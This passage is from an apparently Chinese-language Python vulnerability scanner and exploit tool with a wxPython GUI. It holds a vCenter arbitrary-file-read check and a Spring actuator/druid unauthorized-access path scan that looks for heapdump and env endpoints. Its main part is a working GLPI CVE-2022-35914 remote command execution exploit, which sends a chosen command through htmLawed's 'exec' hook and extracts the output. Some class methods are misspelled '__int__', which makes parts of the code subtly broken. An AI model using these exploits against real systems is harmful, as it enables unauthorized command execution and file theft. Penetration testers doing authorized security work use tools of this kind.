            resp_win = requests.get(url=f'{url}{win_poc}', headers=headers, verify=False, timeout=3)
            if resp_linux.status_code == 200:
                if resp_linux.text.find('root') != -1:
                    return f'[+]存在VCenter任意文件读取 linux\n{url}{linux_poc}\n'
                else:
                    return '[-]不存在VCenter任意文件读取 linux\n'
            elif resp_win.status_code == 200:
                if resp_win.text.find('username') != -1:
                    return f'[+]存在VCenter任意文件读取 windows\n{url}{win_poc}'
                else:
                    return '[-]不存在VCenter任意文件读取 windows\n'
            else:
                return '[-]不存在VCenter任意文件读取\n'
        except Exception as reason:
            return f'{reason}\n'


'''
漏洞名称:
Spring未授权访问漏洞
目录扫描，仅测试spring_pathlist列表里的文件是否存在
'''


class Spring_auth_bypass:
    def __int__(self, url):
        spring_dict = ['headpdump', 'env', 'actuator/heapdump', 'actuator/env', 'druid/index.html', 'api/druid/index.html']
        result_list = []
        try:
            for path in spring_dict:
                resp = requests.get(url=f'{url}/{path}', headers=headers, verify=False, timeout=3)
                if resp.status_code == 200:
                    result_list.append(f'{url}/{path}   status:{resp.status_code}')
            if result_list == []:
                return '[-]不存在Spring未授权访问漏洞\n'
            else:
                return f'[+]存在Spring未授权访问漏洞\n{result_list}\n'
        except Exception as reason:
            return f'{reason}\n'


'''
漏洞名称:
GLPI htmLawedTest.php 远程命令执行漏洞 CVE-2022-35914
影响版本:
GLPI 10.0.2及以前的
'''


class CVE_2022_35914:
    def __int__(self, url, cmd):
        path = '/vendor/htmlawed/htmlawed/htmLawedTest.php'
        try:
            s = requests.session()
            resp_part1 = s.get(url=f'{url}{path}', headers=headers, verify=False, timeout=3)
            if resp_part1.status_code != 200:
                return '[-]不存在CVE_2022_35914'
            soup = BeautifulSoup(resp_part1.text, 'html.parser')
            if soup.title.text.find("htmLawed") == -1:
                return '[-]不存在CVE_2022_35914'
            else:
                token_value = soup.find_all(id='token')[0]['value']
                sid_value = s.cookies.get("sid")
                poc = {"token": token_value, "text": cmd, "hhook": 'exec', "sid": sid_value}
                resp_part2 = s.post(url=f'{url}{path}', verify=False, headers=headers, data=poc)
                result = re.findall(' =&gt; (.*?)<br />\n\)<br />',resp_part2.text)
                return f'[+]{result[0]}'
        except Exception as reason:
            return f'{reason}\n'


class Myapp(wx.App):
    # 窗口初始化所调用的方法等于__init__
    def OnInit(self):
        frame = Frame()
        frame.Show()
        return True


if __name__ == '__main__':
    app = Myapp()
    app.MainLoop()
